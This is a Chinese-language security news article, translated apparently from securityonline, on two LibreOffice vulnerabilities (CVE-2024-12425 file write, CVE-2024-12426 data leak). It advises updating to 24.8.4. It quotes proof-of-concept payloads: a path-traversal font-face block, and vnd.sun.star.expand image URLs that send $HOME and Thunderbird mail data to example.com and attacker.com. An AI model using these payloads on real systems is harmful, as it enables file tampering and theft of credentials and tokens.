---
title: LibreOffice 严重漏洞：或致系统被写入文件及数据泄露，需更新版本
url: https://www.anquanke.com/post/id/304422
source: 安全客-有思想的安全新媒体
date: 2025-02-19
fetch_date: 2025-10-06T20:36:06.015098
---

# LibreOffice 严重漏洞：或致系统被写入文件及数据泄露，需更新版本

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# LibreOffice 严重漏洞：或致系统被写入文件及数据泄露，需更新版本

阅读量**67819**

发布时间 : 2025-02-18 11:11:42

**x**

##### 译文声明

本文是翻译文章，文章原作者 do son，文章来源：securityonline

原文地址：<https://securityonline.info/libreoffice-vulnerabilities-cve-2024-12425-cve-2024-12426-pocs-released-patch-asap/>

译文仅供参考，具体内容表达以及含义原文为准。

![LibreOffice Vulnerabilities]()

Codean 实验室的网络安全研究人员在 LibreOffice 软件中发现了两个漏洞，这些漏洞可导致任意文件写入，以及从环境变量和配置文件中远程提取数据。这两个漏洞分别是 CVE-2024-12425（任意文件写入）和 CVE-2024-12426（远程文件读取），用户只需打开恶意文档，无需其他交互操作，就可能被利用，这使得它们在桌面环境和服务器环境中都极具可利用性。

研究人员警告称：“这两个漏洞都是在加载文档时触发，无需用户进行任何交互操作。” 他们强调了对于个人用户以及在自动化服务器端工作流程中使用 LibreOffice 的组织而言，存在的风险。

CVE-2024-12425 漏洞源于 LibreOffice 处理.fodt（扁平开放文档格式，Flat ODF）文档中嵌入字体的方式。在加载文档时，该应用程序会提取字体数据，并将其以.ttf 文件的形式存储在临时目录中。然而，由于输入验证不当，攻击者可以通过操纵字体族名称，突破指定目录的限制，从而在系统的任意位置写入文件。

研究人员解释道：“因为在以任何方式验证字体之前就会执行这个过程，所以我们可以指定任意的 Base64 编码数据，并在文件系统的任意位置写入我们想要的内容。”

一个精心构造的包含以下代码片段的.fodt 文件，可以将一个名为 pwned0.ttf 的任意文件写入受害者的主目录：

<style:font-face style:name=”Foobar” svg:font-family=”../../../../../../../pwned” style:font-family-generic=”roman” style:font-pitch=”variable”>

<svg:font-face-src>

<svg:font-face-uri loext:font-style=”normal” loext:font-weight=”normal”>

<office:binary-data>SGVsbG8gd29ybGQgaW5zaWRlIGEgZm9udCBmaWxlIQ==

</office:binary-data>

<svg:font-face-format svg:string=”opentype”/>

</svg:font-face-uri>

</svg:font-face-src>

</style:font-face>

当这个恶意文件被打开时，攻击者就获得了对系统中任意路径的写入权限，唯一的限制是文件扩展名必须为.ttf。

第二个漏洞 CVE-2024-12426，能让攻击者窃取敏感的系统信息，包括环境变量、凭证以及配置文件。

LibreOffice 支持一种鲜为人知的 URL 方案 ——vnd.sun.star.expand，该方案可以展开来自 INI 文件和环境变量的变量。这使得攻击者能够构造一个文档，在打开时无声地泄露用户数据。

研究人员警告称：“这个方案特别值得关注，因为它具有变量替换功能，让人联想到 Log4j 漏洞。”

一个包含以下代码片段的恶意文档会提取受害者的主目录，并将其发送到攻击者控制的服务器：

<img src=”vnd.sun.star.expand:https://example.com?foo=$HOME”>

这种技术不仅限于提取环境变量。LibreOffice 的 INI 解析器非常宽松，它甚至可以读取 TOML 和.env 配置文件，而这些文件通常包含 API 密钥、数据库凭证和机密令牌。

研究人员警告称：“如果用户的 shell 历史文件中有包含‘=’的行，那么即使是在某个时候手动传递给不同进程的环境变量，也可能被提取出来。”

一个现实世界中的利用场景是攻击者从受害者的电子邮箱收件箱中窃取 WordPress 重置令牌：

1.攻击者触发对受害者 WordPress 账户的密码重置请求。

2.他们向受害者发送一个恶意的.odt 或.doc 文件。

3.受害者打开该文件，文件会从受害者的雷鸟（Thunderbird）电子邮件客户端中提取重置令牌。

4.攻击者捕获该令牌，并接管受害者的 WordPress 网站。

攻击载荷使用递归替换来提取雷鸟的电子邮件数据库：

<img src=”vnd.sun.star.expand:https://attacker.com/?q=${file\://$HOME/.thunderbird/${file\://$HOME/.thunderbird/profiles.ini:Profile0:Path}/global-messages-db.sqlite:https\://victim-blog.com/wp-login.php?action}”>

这种攻击能够成功，是因为雷鸟以原始形式存储电子邮件内容，而 WordPress 的密码重置邮件以一种可预测的方式格式化令牌。

研究人员警告称：“这当然是一个非常特殊的情况，但这样的有针对性的攻击很容易针对不同的电子邮件客户端（甚至可能是聊天应用程序）以及其他敏感的电子邮件内容进行调整。”

Codean 实验室提供了概念验证（PoC）文件，以帮助管理员确定他们安装的 LibreOffice 是否存在漏洞。

为防范这些漏洞，请将您的 LibreOffice 更新到 24.8.4 版本或更高版本。

本文翻译自securityonline [原文链接](https://securityonline.info/libreoffice-vulnerabilities-cve-2024-12425-cve-2024-12426-pocs-released-patch-asap/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/304422](/post/id/304422)

安全KER - 有思想的安全新媒体

本文转载自: [securityonline](https://securityonline.info/libreoffice-vulnerabilities-cve-2024-12425-cve-2024-12426-pocs-released-patch-asap/)

如若转载,请注明出处： <https://securityonline.info/libreoffice-vulnerabilities-cve-2024-12425-cve-2024-12426-pocs-released-patch-asap/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [漏洞情报](/tag/%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5)

**+1**0赞

收藏

![](https://p0.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p4.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p0.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=170061)

[安全客](/member.html?memberId=170061)

这个人太懒了，签名都懒得写一个

* 文章
* **2096**

* 粉丝
* **6**

### TA的文章

* ##### [英国通过数据访问和使用监管法案](/post/id/308719)

  2025-06-20 17:11:10
* ##### [CISA警告：严重缺陷（CVE-2025-5310）暴露加油站设备](/post/id/308715)

  2025-06-20 17:09:03
* ##### [大多数公司高估了AI治理，因为隐私风险激增](/post/id/308708)

  2025-06-20 17:05:02
* ##### [研究人员发现了有史以来最大的数据泄露事件，暴露了160亿个登录凭证](/post/id/308704)

  2025-06-20 17:02:15
* ##### [CVE-2025-6018和CVE-2025-6019漏洞利用：链接本地特权升级缺陷让攻击者获得大多数Linux发行版的根访问权限](/post/id/308701)

  2025-06-20 16:59:36

### 相关文章

* ##### [Apache Airflow 存在权限漏洞，可导致只读用户获取敏感信息](/post/id/312457)

  2025-09-29 18:05:56
* ##### [Formbricks 存在高危漏洞 (CVE-2025-59934)，攻击者可通过伪造JWT令牌导致未授权的密码重置](/post/id/312451)

  2025-09-29 18:05:05
* ##### [Notepad++ 中存在DLL劫持漏洞（CVE-2025-56383），可导致任意代码执行，且POC已公开](/post/id/312448)

  2025-09-29 18:04:33
* ##### [CISA称黑客利用GeoServer漏洞成功入侵一联邦机构](/post/id/312347)

  2025-09-24 16:45:06
* ##### [SolarWinds紧急发布补丁，修复高危远程代码执行漏洞CVE-2025-26399](/post/id/312357)

  2025-09-24 16:43:11
* ##### [Chrome浏览器存在高危漏洞，可致攻击者窃取敏感信息并引发系统崩溃](/post/id/312366)

  2025-09-24 16:42:08
* ##### [CVE-2025-55241：CVSS评分10.0的Microsoft Entra ID漏洞可能危及全球所有租户](/post/id/312294)

  2025-09-22 18:14:51

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)